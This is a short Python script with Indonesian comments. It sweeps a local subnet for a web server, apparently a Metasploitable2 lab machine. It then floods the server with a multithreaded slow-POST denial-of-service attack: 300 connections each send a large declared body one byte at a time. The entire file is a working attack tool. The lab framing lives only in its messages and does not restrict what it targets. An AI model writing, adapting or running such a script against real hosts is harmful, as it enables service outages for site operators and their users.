import socket
import threading
import time

def is_metasploitable(ip):
    try:
        s = socket.create_connection((ip, 80), timeout=2)
        s.sendall(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        response = s.recv(4096).decode(errors="ignore").lower()
        s.close()
        if ("Apache" in response) or ("server" in response and "simulasi web server" in response): #kata kunci untuk web server target
            return True
    except:
        pass
    return False

def find_target_ip(subnet="192.168.1.0/24"):
    base_ip = subnet.rsplit('.', 1)[0]
    for i in range(2, 255):  # skip 192.168.1.1
        ip = f"{base_ip}.{i}"
        print(f"[*] Scanning {ip} ...")
        if is_metasploitable(ip):
            print(f"[+] Metasploitable detected at {ip}")
            return ip
    return None

def slow_post(target_ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, 80))
        s.sendall(b"POST / HTTP/1.1\r\n")
        s.sendall(b"Host: " + target_ip.encode() + b"\r\n")
        s.sendall(b"Content-Length: 100000\r\n")
        s.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
        for i in range(1000000):	# mengirim sebanyak 1000000 total ke server
            s.send(b"A")	# mengirim karakter A
            time.sleep(0.05)
    except:
        pass

if __name__ == "__main__":
    print("[*] Searching for Metasploitable2...")
    ip = find_target_ip()
    if ip:
        print(f"[*] Launching attack on {ip}...")
        for i in range(300):	# Jumlah thread serangan dalam 1 IP
            threading.Thread(target=slow_post, args=(ip,)).start()
            time.sleep(0.01)	# rentang waktu pengiriman
    else:
        print("[!] No valid target found.")
